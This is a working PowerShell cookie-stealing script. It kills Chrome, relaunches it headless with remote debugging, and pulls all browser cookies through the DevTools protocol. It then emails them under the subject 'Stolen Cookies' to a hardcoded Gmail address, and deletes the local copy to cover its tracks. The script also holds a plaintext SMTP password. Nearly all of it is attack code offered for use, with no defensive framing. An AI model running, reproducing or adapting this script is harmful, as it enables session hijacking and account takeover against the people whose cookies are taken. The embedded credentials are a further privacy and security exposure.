# Parameters
$toMail = "silvermo2010@gmail.com"
$remoteDebuggingPort = 9222
$chromePath = "C:\Program Files\Google\Chrome\Application\chrome.exe"
$outputFile = ".\Chrome-Cookies.json"
$smtpServer = "smtp.gmail.com"
$smtpPort = 587
$smtpUser = "silvermo2010@gmail.com"
$smtpPassword = "No9KqH4Yruua7jOP"

# Function to quit Chrome process
function Quit-Chrome {
    Write-Host "Quitting Chrome if running..."
    Get-Process -Name "chrome" -ErrorAction SilentlyContinue | Stop-Process -Force
}

# Function to send and receive WebSocket messages
function Send-Receive-WebSocketMessage {
    param (
        [string] $WebSocketUrl,
        [string] $Message
    )

    try {
        # Load required assembly
        Add-Type -AssemblyName System.Net.WebSockets
        $webSocket = [System.Net.WebSockets.ClientWebSocket]::new()

        # Connect WebSocket
        $uri = [Uri]$WebSocketUrl
        $connectTask = $webSocket.ConnectAsync($uri, [Threading.CancellationToken]::None)
        $connectTask.Wait()

        if ($webSocket.State -ne [System.Net.WebSockets.WebSocketState]::Open) {
            throw "WebSocket connection failed. State: $($webSocket.State)"
        }

        # Send message
        $bytesToSend = [Text.Encoding]::UTF8.GetBytes($Message)
        $segmentToSend = [Array]$bytesToSend
        $sendTask = $webSocket.SendAsync($segmentToSend, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, [Threading.CancellationToken]::None)
        $sendTask.Wait()

        # Receive response
        $bufferSize = 8192
        $buffer = New-Object Byte[] $bufferSize
        $receivedBytes = New-Object System.Collections.Generic.List[Byte]

        do {
            $result = $webSocket.ReceiveAsync($buffer, [Threading.CancellationToken]::None)
            $result.Wait()
            if ($result.Result.Count -gt 0) {
                $receivedBytes.AddRange($buffer[0..($result.Result.Count - 1)])
            }
        } while (-not $result.Result.EndOfMessage)

        # Close WebSocket
        $closeTask = $webSocket.CloseAsync([System.Net.WebSockets.WebSocketCloseStatus]::NormalClosure, "Closing", [Threading.CancellationToken]::None)
        $closeTask.Wait()

        # Return message
        $responseString = [Text.Encoding]::UTF8.GetString($receivedBytes.ToArray())
        return $responseString
    }
    catch {
        Write-Error "WebSocket error: $_"
        return $null
    }
}

# Quit existing Chrome processes
Quit-Chrome

# Launch Chrome with remote debugging
Write-Host "Launching Chrome with remote debugging..."
Start-Process -FilePath $chromePath -ArgumentList "--headless", "--remote-debugging-port=$remoteDebuggingPort", "https://google.com" | Out-Null

# Wait for Chrome to initialize
Start-Sleep -Seconds 3

# Fetch WebSocket Debugger URL
$jsonUrl = "http://localhost:$remoteDebuggingPort/json"
try {
    $jsonResponse = Invoke-RestMethod -Uri $jsonUrl -Method Get
    if ($null -eq $jsonResponse) {
        throw "Failed to get Chrome debugging info."
    }
}
catch {
    Write-Error "Error fetching Chrome JSON info: $_"
    Quit-Chrome
    exit
}

# Extract WebSocket URL
$WebSocketUrl = $jsonResponse | Select-Object -ExpandProperty webSocketDebuggerUrl
if ([string]::IsNullOrEmpty($WebSocketUrl)) {
    Write-Error "Could not find WebSocket debugger URL."
    Quit-Chrome
    exit
}

# Prepare message to get cookies
$Message = '{"id":1,"method":"Network.getAllCookies"}'

# Send WebSocket message and get response
Write-Host "Requesting cookies..."
$responseString = Send-Receive-WebSocketMessage -WebSocketUrl $WebSocketUrl -Message $Message

if ([string]::IsNullOrEmpty($responseString)) {
    Write-Error "Failed to receive cookie data."
    Quit-Chrome
    exit
}

# Parse response JSON
try {
    $responseJson = $responseString | ConvertFrom-Json
} catch {
    Write-Error "Failed to parse JSON response: $_"
    Quit-Chrome
    exit
}

# Extract cookies array
if ($responseJson.result -and $responseJson.result.cookies) {
    $cookies = $responseJson.result.cookies
} else {
    Write-Error "No cookies found in response."
    Quit-Chrome
    exit
}

# Convert cookies to JSON string
$cookiesJson = $cookies | ConvertTo-Json -Depth 10

# Save cookies to file
Set-Content -Path $outputFile -Value $cookiesJson
Write-Host "Cookies saved to $outputFile."

# Quit Chrome
Write-Host "Closing Chrome..."
Quit-Chrome

# Send cookies via email
Write-Host "Sending cookies via email..."
$smtpSecurePassword = ConvertTo-SecureString $smtpPassword -AsPlainText -Force
$smtpCredential = New-Object System.Management.Automation.PSCredential($smtpUser, $smtpSecurePassword)

try {
    Write-Host "Attempting to send email..."
    Send-MailMessage -From $smtpUser -To $toMail -Subject "Stolen Cookies" -Body $cookiesJson -SmtpServer $smtpServer -Port $smtpPort -UseSsl -Credential $smtpCredential -Verbose
    Write-Host "Email sent successfully."
} catch {
    Write-Error "Failed to send email. Error details:"
    Write-Error $_
}

# Cleanup
if (Test-Path $outputFile) {
    Remove-Item $outputFile -Force
    Write-Host "Cleaned up temporary files."
}

Write-Host "Process completed."
